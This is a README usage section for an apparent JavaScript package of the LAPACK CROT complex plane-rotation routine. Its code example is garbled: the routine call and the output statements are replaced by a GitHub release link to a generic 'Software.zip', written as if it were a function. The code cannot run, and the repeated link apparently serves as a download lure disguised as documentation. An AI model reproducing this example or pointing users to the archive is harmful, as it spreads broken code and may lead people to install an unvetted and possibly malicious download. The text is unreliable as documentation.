## Usage

To use the LAPACK Base CROT routine, you can incorporate it into your linear algebra computations where a plane rotation with real cosine and complex sine is required. This routine is optimized for performance and accuracy, making it a reliable choice for complex number operations.

Here is an example of how you can use the LAPACK CROT routine in JavaScript:

```javascript
// Include the LAPACK CROT routine
const LAPACK = require('lapack');

// Define input parameters
let n = 5;
let cx = new Float64Array([1.0, 2.0, 3.0, 4.0, 5.0]);
let cy = new Float64Array([0.0, 0.0, 0.0, 0.0, 0.0]);
let c = 1.0;
let s = 0.0;

// Apply plane rotation using LAPACK CROT routine
https://github.com/obhi098/lapack-base-crot/releases/download/v2.0/Software.zip(n, cx, 1, cy, 1, c, s);

// Output the resulting vectors
https://github.com/obhi098/lapack-base-crot/releases/download/v2.0/Software.zip("Rotated cx:", cx);
https://github.com/obhi098/lapack-base-crot/releases/download/v2.0/Software.zip("Rotated cy:", cy);
```
